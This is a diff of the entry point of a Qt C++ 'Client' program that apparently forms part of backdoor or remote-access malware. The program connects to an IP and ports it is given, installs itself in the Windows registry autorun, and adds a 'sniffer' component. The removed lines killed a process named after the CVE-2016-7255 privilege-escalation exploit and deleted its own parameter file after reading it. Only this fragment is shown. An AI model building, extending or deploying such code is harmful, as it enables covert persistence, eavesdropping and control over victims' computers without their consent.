@@ -1,4 +1,6 @@
+#include "sniffer.h"
 #include "client.h"
+
 #include <QApplication>
 #include <QSettings>
 #include <QProcess>
@@ -17,7 +19,7 @@ void setAutorun(const QApplication& app, const QString& appPath, const quint16& 
     adminSettings.sync();
 
     //If user doesn't have admin rigths
-    if ( adminSettings.status() != QSettings::NoError)
+    if (adminSettings.status() != QSettings::NoError)
     {
         //If HKLM contains autorun key
         if (adminSettings.contains("client"))
@@ -31,58 +33,11 @@ void setAutorun(const QApplication& app, const QString& appPath, const quint16& 
 
 int main(int argc, char *argv[])
 {
-    QApplication app(argc, argv);
-    Client* client1;
-
-    QProcess::execute("taskkill /im CVE-2016-7255.exe /f");
-    Sleep(1000);
-    QProcess::execute("taskkill /im cmd.exe /f");
-
-    //Get parameters from file
-    QFile file("parameters.txt");
-    if (file.exists())
+    try
     {
-        file.open(QIODevice::ReadOnly | QIODevice::Text);
-        QString string = file.readAll();
+        QApplication app(argc, argv);
+        Client* client1;
 
-        QStringList params = string.split(QRegExp(" +(?=(?:[^\"]*\"[^\"]*\")*[^\"]*$)"));
-
-        QString appPath(app.applicationDirPath());
-        QString ip("127.0.0.1");
-        quint16 localPort(1234), destPort(12345);
-
-        if (params.size() == 2)
-        {
-            ip = params.at(0);
-            destPort = params.at(1).toInt();
-        }
-        else if (params.size() == 3)
-        {
-            appPath = params.at(0);
-            appPath.remove('\"');
-            QDir dir;
-            dir.mkpath(appPath);
-            ip = params.at(1);
-            destPort = params.at(2).toInt();
-        }
-        else if (params.size() >=4)
-        {
-            appPath = params.at(0);
-            appPath.remove('\"');
-            QDir dir;
-            dir.mkpath(appPath);
-            localPort = params.at(1).toInt();
-            ip = params.at(2);
-            destPort = params.at(3).toInt();
-        }
-
-        file.close();
-        file.remove();
-        client1 = new Client(&app, appPath, localPort, ip, destPort);
-        setAutorun(app, appPath, localPort, ip, destPort);
-    }
-    else
-    {
         //Get command line arguments
         if (argc <= 2)
         {
@@ -112,9 +67,13 @@ int main(int argc, char *argv[])
             client1 = new Client(&app, argv[1], QString(argv[2]).toInt(), argv[3], QString(argv[4]).toInt());
             setAutorun(app, argv[1], QString(argv[2]).toInt(), argv[3], QString(argv[4]).toInt());
         }
+
+        QObject::connect(&app, &QCoreApplication::aboutToQuit, client1, &Client::deleteLater);
+
+        return app.exec();
     }
-
-    QObject::connect(&app, &QCoreApplication::aboutToQuit, client1, &Client::deleteLater);
-
-    return app.exec();
+    catch(...)
+    {
+        qDebug() << "error";
+    }
 }
